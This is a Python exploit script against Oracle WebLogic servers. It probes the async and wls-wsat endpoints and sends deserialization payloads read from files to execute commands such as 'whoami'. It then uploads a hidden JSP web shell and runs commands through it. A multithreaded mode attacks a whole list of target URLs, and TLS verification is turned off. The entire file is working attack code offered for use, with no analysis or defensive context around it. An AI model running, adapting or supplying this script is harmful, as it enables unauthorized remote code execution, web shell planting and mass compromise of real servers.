# -*- coding:utf-8 -*-
import requests
import threading
import time
import sys
from multiprocessing.dummy import  Pool as ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning



# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

with open('payload.txt','r') as f:
    PAYLOAD = f.read()
with open('payload2.txt','r') as f:
    PAYLOAD2 = f.read()
with open('payload3.txt','r') as f:
    PAYLOAD3 = f.read()


#从文件中获取项目列表
def get_all_url(filename):
    url_list = []
    for url in open(filename,'r'):
        url = url.strip()
        if 'http' not in url:
            url = 'http://' + url
        url_list.append(url)
    return url_list

def weblogic_10_3_6(url,cmd):
    headers = {
    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"text/xml",
    "cmd":"%s"%(cmd)}
    try:
        for i in range(5):
            rsp = requests.post(url, data=PAYLOAD2, verify=False, headers=headers,timeout=10)
            if cmd in rsp.text and 'xml' not in rsp.text:
                print(url)
                print(rsp.text)
                return False
            time.sleep(2)
        return True
    except:
        pass

def weblogic_12_1_3(url,cmd):
    headers = {
    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"text/xml"}
    payload3 = PAYLOAD3.replace('command',cmd)
    try:
        for i in range(5):
            rsp = requests.post(url, data=payload3, verify=False, headers=headers,timeout=10)
            if cmd in rsp.text and 'xml' not in rsp.text:
                print(url)
                print(rsp.text)
                break
            time.sleep(2)
    except:
        pass

#上传jsp并测试
def get_webshell_test(url):
    webshell_name = '.s8Jn4gWlqX2c592.jsp'
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36','Content-Type':'text/xml;charset=UTF-8','fileName':webshell_name,'Content-Length':'239842','Connection':'close'}
    headers2 = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
    try:
        ip_port = url.split('/')[2]
        if 'https' in url:
            url = 'https://' + ip_port + '/_async/AsyncResponseService'
            u2 = 'https://' + ip_port + '/wls-wsat/CoordinatorPortType'
        else:          
            url = 'http://' + ip_port + '/_async/AsyncResponseService'
            u2 = 'http://' + ip_port + '/wls-wsat/CoordinatorPortType'
        r0 = requests.get(url, headers=headers2,timeout = 10,verify=False)
        r2 = requests.get(u2, headers=headers2,timeout = 10,verify=False)
        if r2.status_code == 200 and 'Web Services' in r2.text:
            #print(u2)
            cmd = 'whoami'
            if weblogic_10_3_6(u2,cmd):
                weblogic_12_1_3(u2,cmd)
        if r0.status_code == 200 and 'WSDL' in r0.text:
            #print(url)
            r1 = requests.post(url, headers=headers,data=PAYLOAD,timeout = 10,verify=False)
            if r1.status_code == 202:
                if 'https' in url:
                    shell_url = 'https://' + url.split('/')[2] + '/_async/' + webshell_name
                else:
                    shell_url = 'http://' + url.split('/')[2] + '/_async/' + webshell_name
                for i in range(10):
                    r2 = requests.get(shell_url, headers=headers2,timeout = 10,verify=False)
                    if r2.status_code == 200 and r2.headers['Content-Length'] == '17':
                        #print(shell_url)
                        cookie = r2.headers['Set-Cookie']
                        if cookie:
                            cmd_url = shell_url+'?cmd=whoami'
                            headers3 = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0','Cookie':cookie}
                            r3 = requests.get(cmd_url,headers=headers3,timeout=10,verify=False)
                            r3_text = r3.text
                            if '<pre>' in r3_text:
                                r3_text = r3_text.replace('<pre>','').replace('</pre>','').strip()
                                print(cmd_url)
                                print('Cookie:'+cookie)
                                print('whoami:')
                                print(r3_text)
                            else:
                                print(shell_url)
                                print('Cookie:'+cookie)
                        else:
                            print(shell_url)   
                        break
                    time.sleep(2)
    except:
        pass

if __name__ == "__main__":
    h = '''
         ____                ____ ____     ____ 
|\- ' - '\              /- ' - '/|\- ' - ' \   |\- ' - '\ 
| '\- ' - '\  ___    /- ' - '/ '| \- ' - ' \ '|  \- ' - '\  ___ 
 \ '|- ' - '|/- ' - '\  |- ' - ''|,/ \,|- ' - ' |  \ |- ' - ''|/- ' - '\ 
  '/- ' - '/- /|- ' -| |\- ' - ''\   /- ' - ' /|   /- ' - '/ '/|- ' - '| 
 /'__'__'/ /_'_'/|'|  \'__'_\/'__'_,/ '| /'__'__''/ /_'_,/| 
 ||¯`'¯¯`'| ||¯`'| | \  ||¯`'¯||¯`'¯'  | '/ ||¯`'¯`' '| ||¯`'¯'|'| 
 |L..    ';|/|;.  |/   '\|L..  ||L..   ;|/  |L..    ';|/|L..FûNK 
  ¯¯¯¯¯   ¯¯       ¯¯¯¯ ¯¯¯¯     ¯¯¯¯¯   ¯¯¯Æ¨
  usage:
  python3 weblogic_get_webshell.py http://url
  python3 weblogic_get_webshell.py all
        '''
    if len(sys.argv) == 1:
        print(h)
        exit
    elif len(sys.argv) == 2:
        url_list = [sys.argv[1]]
        if sys.argv[1] == 'all':
            url_list = get_all_url('url_list.txt')
        pool = ThreadPool(30)
        pool.map(get_webshell_test,url_list)
        pool.close()
        pool.join()
    else:
        print(h)
        exit
